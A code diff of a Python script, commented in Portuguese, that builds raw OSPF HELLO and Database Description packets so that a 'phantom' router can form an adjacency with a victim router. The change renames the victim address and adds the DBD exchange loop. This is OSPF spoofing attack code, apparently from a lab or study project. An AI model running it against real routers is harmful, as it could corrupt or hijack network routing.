@@ -14,11 +14,12 @@ IF_NAME = 'wlp3s0'
 PHANTON_ID = '2.2.2.2'
 # area configurada no roteador OSPF vitima 
 AREA_ID = '3.3.3.3'
+
 # Ip do roteador fantasma
 DESIGNATED_ROUTER = '192.168.0.70'
 BKP_ROUTER = '0.0.0.0'
 # neighbors - roteadores vítimas
-PHANTON_ROUTER_IP = '192.168.0.40'
+VICTIM_ROUTER_IP = '192.168.0.40'
 
 # DB_DESCRIPTION control bits
 FIRST_DB = 0x07 # 111
@@ -41,9 +42,8 @@ def hello_packet(ospf):
     '''
         Montagem do pacote COMPLETO de OSPF HELLO a ser enviado
     '''
-    hello_data = ospf.hello_packet('255.255.255.0',
-                                    DESIGNATED_ROUTER,
-                                    BKP_ROUTER, PHANTON_ROUTER_IP)
+    hello_data = ospf.hello_packet('255.255.255.0', DESIGNATED_ROUTER,
+                                    BKP_ROUTER, VICTIM_ROUTER_IP)
     return base_package(len(hello_data)) + hello_data
 
 
@@ -70,10 +70,15 @@ def main():
 
     ospf = OSPF(PHANTON_ID, AREA_ID)
 
-    # Envia hello com a informação da vítima
+    # ================= Enviando HELLO =================
     s.send(hello_packet(ospf))
 
+    # ================= Enviando DATABASE DESCRIPTION =================
     s.send(dbd_description_packet(ospf, FIRST_DB, 1))
+    for i in range (2,11):
+        s.send(dbd_description_packet(ospf, SEND_MORE, i))
+
+    s.send(dbd_description_packet(ospf, NO_MORE, 11))
     
     # Vazio, apenas com flag de inicialização, flag de mestre, flag MS(more segments, vai mandar mais segmentos)
     # tem q incluir um nro de sequencia inicial
@@ -85,8 +90,5 @@ def main():
     
     
     
-
-
-
 if __name__ == '__main__':
     main()
